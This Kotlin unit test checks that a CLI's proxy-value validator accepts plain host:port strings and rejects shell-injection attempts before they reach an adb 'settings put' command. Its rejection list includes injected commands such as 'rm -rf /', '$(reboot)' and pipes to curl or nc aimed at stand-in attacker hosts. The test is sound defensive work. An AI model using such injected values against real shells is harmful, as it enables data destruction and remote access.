package dev.reticle.cli

import kotlin.test.Test
import kotlin.test.assertFailsWith

/**
 * [HelperProxyCommands.validateProxyValue] is the only guard between a
 * caller-supplied proxy string and `settings put global http_proxy <value>` in
 * an adb shell, so it must reject anything that could break out of the argument.
 */
class HelperProxyCommandsTest {

    @Test
    fun acceptsPlainHostPort() {
        HelperProxyCommands.validateProxyValue("10.0.2.2:8888")
        HelperProxyCommands.validateProxyValue("proxy.example.com:3128")
    }

    @Test
    fun rejectsShellInjectionAndMalformedValues() {
        val bad = listOf(
            "10.0.2.2:8888;rm -rf /",   // command separator + space
            "\$(reboot)",                // command substitution
            "host:8888 && curl evil",    // logical operator + space
            "host:8888|nc attacker 1",   // pipe
            "`id`:8888",                  // backticks
            "no-colon-here",             // missing host:port colon
            "a b:1",                      // whitespace
        )
        for (value in bad) {
            assertFailsWith<CliError>("expected '$value' to be rejected") {
                HelperProxyCommands.validateProxyValue(value)
            }
        }
    }
}
